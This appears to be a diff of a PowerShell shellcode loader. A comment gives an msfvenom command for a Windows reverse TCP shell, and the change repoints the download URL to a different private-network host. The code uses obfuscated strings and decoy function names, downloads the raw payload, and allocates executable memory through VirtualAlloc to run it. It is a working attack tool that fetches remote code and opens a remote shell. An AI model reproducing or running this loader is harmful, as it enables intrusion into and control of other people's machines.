@@ -18,7 +18,7 @@ return ${ty`Pe}.("{1}{2}{0}{3}" -f 'ea','C','r','teType').Invoke()
 }
 
 # msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.235.130 LPORT=443 -f raw > rev.bin
-$url = "http://192.168.235.130:8000/rev.bin"
+$url = "http://192.168.45.1:80/rev.bin"
 [Byte[]] $buf = [System.Net.WebClient]::new().DownloadData($url)
 
 $cucumbers = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll VirtualAlloc), (apples @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $buf.Length, 0x3000, 0x40)
